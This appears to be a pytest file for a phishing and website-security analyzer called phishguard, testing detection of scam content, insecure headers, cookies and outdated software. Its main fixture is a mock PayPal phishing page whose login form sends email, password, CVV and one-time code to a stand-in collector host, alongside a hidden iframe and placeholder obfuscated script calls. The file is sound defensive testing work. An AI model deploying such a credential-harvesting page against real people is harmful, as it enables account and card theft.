from phishguard.analyzers.content_analyzer import analyze_content
from phishguard.analyzers.url_analyzer import analyze_url, normalize_url
from phishguard.analyzers.web_security import analyze_web_security, grade
from phishguard.netsafe import FetchResult

PHISH = """<html><head><title>PayPal - Log in to your account</title></head><body>
<h1>PayPal Security Check</h1><p>Your account has been suspended. Verify your identity within 24 hours or it will be limited.</p>
<img src="https://www.paypalobjects.com/logo.png"><script src="https://www.paypal.com/x.js"></script>
<form action="https://collector.evil.example/post.php" method="post"><input name="email"><input type="password" name="pw">
<input name="cvv" placeholder="CVV"><input name="otp"></form>
<iframe src="http://x.example/a" width="0" height="0"></iframe>
<script>eval(atob('a'));eval(atob('b'));eval(unescape('c'));eval(atob('d'));</script></body></html>"""


def fetch(body, url="https://secure-paypa1.example-host.top/login", headers=None, cookies=None):
    return FetchResult(ok=True, url=url, final_url=url, status=200, body=body, headers=headers or {}, set_cookies=cookies or [],
                       chain=[{"url": url, "status": 200}], tls_verified=True, content_type="text/html")


def test_phishing_page_detected():
    fr = fetch(PHISH)
    uf = analyze_url(normalize_url(fr.url))["features"]
    sigs, info = analyze_content(fr, uf)
    ids = {s.id for s in sigs}
    assert {"content.form_cross_domain", "content.brand_mismatch", "content.hidden_iframe", "content.obfuscated_js",
            "content.sensitive_fields", "content.hotlinked_brand_assets", "content.theme.urgency"} <= ids
    assert next(s for s in sigs if s.id == "content.brand_mismatch").severity == "high"


def test_official_login_page_is_not_flagged():
    url = "https://www.paypal.com/signin"
    fr = fetch(PHISH.replace("collector.evil.example", "www.paypal.com"), url)
    uf = analyze_url(url)["features"]
    sigs, _ = analyze_content(fr, uf)
    assert not any(s.weight >= 10 for s in sigs if s.id.startswith("content.brand") or s.id.startswith("content.form"))


def test_news_article_about_brand_is_low_weight():
    fr = fetch("<html><title>Why PayPal changed its fees</title><body><h1>PayPal news</h1><a href='/a'>a</a><a href='/b'>b</a><a href='/c'>c</a></body></html>",
               "https://news.example.org/paypal-fees")
    sigs, _ = analyze_content(fr, analyze_url(fr.url)["features"])
    bm = [s for s in sigs if s.id == "content.brand_mismatch"]
    assert bm and bm[0].weight <= 8


def test_job_scam_language():
    fr = fetch("<html><title>Hiring</title><body>Work from home! Earn Rs 5000 per day. Pay a registration fee of Rs 999 to confirm your offer letter. Join our Telegram.</body></html>",
               "https://jobs-now.example.top/")
    sigs, _ = analyze_content(fr, analyze_url(fr.url)["features"])
    assert {"content.theme.job_scam", "content.theme.payment_scam"} <= {s.id for s in sigs}


def test_executable_download_flagged():
    fr = FetchResult(ok=True, url="http://x.test/a", final_url="http://x.test/a", status=200, non_html=True,
                     content_type="application/vnd.android.package-archive", chain=[{"url": "http://x.test/a", "status": 200}])
    sigs, _ = analyze_content(fr, {})
    assert "content.download" in {s.id for s in sigs}


def test_web_security_headers_and_cookies():
    hdr = {"server": "Apache/2.2.15 (CentOS)", "x-powered-by": "PHP/5.6.40"}
    body = "<html><script src='http://cdn.example/a.js'></script><script src='https://code.jquery.com/jquery-1.12.4.min.js'></script><title>Index of /</title></html>"
    fr = fetch(body, "https://site.example.com/", hdr, ["PHPSESSID=abc; path=/"])
    sigs, info = analyze_web_security(fr, https_redirect=False)
    ids = {s.id for s in sigs}
    assert {"web.no_hsts", "web.no_csp", "web.no_clickjack", "web.no_nosniff", "web.outdated.apache", "web.outdated.php",
            "web.cookie_secure", "web.cookie_httponly", "web.mixed_active", "web.old_jquery", "web.dir_listing", "web.no_http_redirect"} <= ids
    assert info["grade"] == "F"


def test_well_configured_site_gets_good_grade():
    hdr = {"strict-transport-security": "max-age=63072000; includeSubDomains", "content-security-policy": "default-src 'self'; frame-ancestors 'none'",
           "x-content-type-options": "nosniff", "referrer-policy": "no-referrer", "server": "nginx"}
    sigs, info = analyze_web_security(fetch("<html><title>ok</title></html>", "https://good.example.com/", hdr, ["sid=1; Secure; HttpOnly; SameSite=Lax"]), True)
    assert info["grade"] == "A", [s.id for s in sigs]


def test_grade_boundaries():
    assert [grade(x) for x in (0, 10, 25, 40, 90)] == ["A", "B", "C", "D", "F"]
